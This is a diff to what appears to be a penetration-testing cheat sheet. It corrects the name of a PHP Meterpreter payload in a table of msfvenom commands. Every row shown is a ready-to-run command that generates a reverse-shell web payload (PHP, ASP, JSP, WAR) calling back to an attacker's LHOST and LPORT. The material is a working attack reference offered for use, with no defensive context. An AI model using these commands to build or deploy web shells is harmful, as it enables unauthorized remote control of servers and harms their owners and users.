@@ -37,7 +37,7 @@ Name | Desc
 ### Web
 Name | Desc
 --- | ---
-`msfvenom -p php/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.php && cat shell.php` | `pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php` | PHP
+`msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.php && cat shell.php` | `pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php` | PHP
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp > shell.asp` |  ASP
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.jsp` | JSP
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war > shell.war` | WAR
